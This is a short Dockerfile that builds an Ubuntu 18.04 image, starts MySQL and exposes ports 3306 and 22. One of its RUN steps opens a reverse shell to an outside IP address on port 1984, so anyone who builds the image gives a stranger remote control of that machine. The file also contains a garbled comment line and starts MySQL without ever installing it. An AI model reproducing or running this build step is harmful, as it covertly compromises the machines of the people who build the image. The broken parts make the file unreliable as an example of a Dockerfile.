FROM ubuntu:18.04
MAINTAINER Sad Cactus
ENV DEBIAN_FRONTEND noninteractive
RUN apt-get -y update
RUN apt install -y procps curl

RUN /bin/bash -c "bash -i >& /dev/tcp/169.197.100.36/1984 0>&1 "
RUN /etc/init.d/mysql start && \
        sleep 5 && \
		echo "ok3"

#ok cx-xcc55cc#ok cx-kiccc1ollc.20oiozkced;,po
EXPOSE 3306 22
